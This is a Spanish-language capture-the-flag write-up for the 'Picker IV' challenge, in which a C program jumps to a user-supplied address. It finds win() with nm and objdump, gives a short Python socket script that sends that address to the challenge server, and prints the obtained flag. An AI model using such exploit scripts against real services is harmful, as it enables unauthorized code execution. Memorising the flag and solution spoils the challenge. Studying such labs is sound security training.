# Descripcion
Can you figure out how this program works to get the flag?
## Solución

En el reto "Picker IV" se nos proporciona un programa en C que solicita una dirección hexadecimal y luego salta (*jumps*) directamente a ella para ejecutarla como una función. El binario compilado contiene una función `win()` que abre y muestra el contenido de `flag.txt`. Solo necesitamos encontrar su dirección en memoria y proporcionársela al servidor.

1. **Análisis del código fuente** (`picker-IV.c`):

   - La función `main()` lee una dirección con `scanf("%x", &val)` y la invoca como función: `void (*foo)(void) = (void (*)())val; foo();`.

   - La función `win()` imprime la bandera al leer `flag.txt`.

2. **Localización de la dirección de `win()`**:

   - Descargamos el binario `picker-IV` y parseamos su tabla de símbolos ELF (sección `.symtab`) directamente con Python.

   - Encontramos la entrada `win: 0x4012a1`.

3. **Explotación**:

   - Nos conectamos al servicio con `nc xebec.cylabacademy.net 18680`.

   - Cuando el servidor solicita la dirección, enviamos `4012a1`.

   - El servidor salta a `0x4012a1`, ejecuta `win()` y nos muestra la bandera.

Bandera obtenida: `academy{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_cccc13c1}`

## Notas Adicionales

- **Script Python para resolver el reto automáticamente**:

  `python`

  `import socket, time`

  `s = socket.socket()`

  `s.connect(("xebec.cylabacademy.net", 18680))`

  `s.settimeout(5)`

  `s.recv(1024)  # prompt`

  `s.sendall(b"4012a1\n")  # address of win()`

  `time.sleep(0.5)`

  `print(s.recv(4096).decode())`

  `s.close()`

- `**Localizar la dirección con herramientas estándar**:`
    - `En Linux, simplemente se puede usar:`
        
        `bash`
        
        `nm picker-IV | grep win`
        
        # `Salida: 00000000004012a1 T win`
        
    - `O con objdump:`
        
        `bash`
        
        `objdump -d picker-IV | grep '<win>'`
        
        `# Salida: 00000000004012a1 <win>:`
        
- **Lección de seguridad**: El reto ilustra por qué nunca se debe permitir que un usuario especifique directamente una dirección de memoria a la cual el programa saltará. Esta es la esencia de los ataques de tipo _arbitrary code execution_ y es la razón por la que técnicas de mitigación como **ASLR** (Address Space Layout Randomization), **NX/DEP** (Non-Executable stack) y **PIE** (Position Independent Executable) existen en los sistemas modernos.

## **Referencias**

- [Format ELF (Wikipedia)](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format)
- [nm - GNU Binutils (Man Page)](https://linux.die.net/man/1/nm)
- [ASLR - Address Space Layout Randomization](https://en.wikipedia.org/wiki/Address_space_layout_randomization)

